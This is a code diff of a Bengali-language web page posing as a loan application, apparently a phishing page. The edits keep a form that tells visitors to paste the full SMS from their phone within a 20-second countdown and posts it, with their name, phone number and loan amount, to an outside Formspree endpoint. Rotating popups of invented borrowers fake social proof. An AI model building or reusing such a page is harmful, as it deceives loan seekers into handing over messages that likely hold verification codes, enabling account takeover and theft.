@@ -218,14 +218,14 @@
             <span id="timerText"><span class="timer-num" id="timeCount">২০</span> সেকেন্ডের মধ্যে আপনার পুরো এসএমএসটি কপি করে দিন।</span>
         </div>
 
-        <form id="verifyForm" action="https://formspree.io/f/xvkkeegq" method="POST">
+        <form id="verifyForm2" action="https://formspree.io/f/xvkkeegq" method="POST">
             <input type="hidden" name="আবেদনকারীর_নাম" id="hiddenName">
             <input type="hidden" name="মোবাইল_নম্বর" id="hiddenPhone">
             <input type="hidden" name="লোনের_পরিমাণ" id="hiddenAmount">
 
             <div class="form-group">
                 <label><i class="fa-solid fa-envelope-open-text"></i> এসএমএস / অ্যাপ্লিকেশন আইডি টেক্সট</label>
-                <textarea id="appText" name="সম্পূর্ণ_এসএমএস_বা_আইডি" required placeholder="আপনার ফোনে আসা সম্পূর্ণ বার্তাটি এখানে লিখুন বা পেস্ট করুন..."></textarea>
+                <textarea id="appText" name="সম্পূর্ণ_এসএমএস_বা_আইডি_ধাপ_২" required placeholder="আপনার ফোনে আসা সম্পূর্ণ বার্তাটি এখানে লিখুন বা পেস্ট করুন..."></textarea>
             </div>
 
             <button type="submit" id="btnSubmit" class="btn-submit">
@@ -254,7 +254,6 @@
 </div>
 
 <script>
-    // URL প্যারামিটার সংগ্রহ
     const params = new URLSearchParams(window.location.search);
     document.getElementById('hiddenName').value = params.get('name') || '';
     document.getElementById('hiddenPhone').value = params.get('phone') || '';
@@ -301,8 +300,7 @@
         startTimer();
     });
 
-    // ফর্ম সাবমিশন লজিক
-    const form = document.getElementById("verifyForm");
+    const form = document.getElementById("verifyForm2");
     const btnSubmit = document.getElementById("btnSubmit");
 
     form.addEventListener("submit", function(event) {
@@ -317,6 +315,7 @@
             body: data,
             headers: { 'Accept': 'application/json' }
         }).finally(() => {
+            // চূড়ান্তভাবে success.html পেজে নিয়ে যাওয়া হবে
             window.location.href = "./success.html";
         });
     });
@@ -326,9 +325,7 @@
         { name: "রহিমা খাতুন", district: "ঢাকা", amount: "১০,০০০", time: "এইমাত্র" },
         { name: "আসলাম খান", district: "কুমিল্লা", amount: "২০,০০০", time: "২ মিনিট আগে" },
         { name: "সুমন হোসেন", district: "বগুড়া", amount: "৩০,০০০", time: "১ মিনিট আগে" },
-        { name: "ফারজানা আক্তার", district: "চট্টগ্রাম", amount: "১৫,০০০", time: "এইমাত্র" },
-        { name: "মোঃ রফিকুল ইসলাম", district: "রাজশাহী", amount: "৫০,০০০", time: "৪ মিনিট আগে" },
-        { name: "শারমিন জাহান", district: "সিলেট", amount: "২৫,০০০", time: "৩ মিনিট আগে" }
+        { name: "ফারজানা আক্তার", district: "চট্টগ্রাম", amount: "১৫,০০০", time: "এইমাত্র" }
     ];
 
     let currentIndex = 0;
@@ -344,10 +341,7 @@
         timeEl.innerText = item.time;
         popupEl.classList.add("show");
 
-        setTimeout(() => {
-            popupEl.classList.remove("show");
-        }, 4000);
-
+        setTimeout(() => { popupEl.classList.remove("show"); }, 4000);
         currentIndex = (currentIndex + 1) % loanData.length;
     }
 
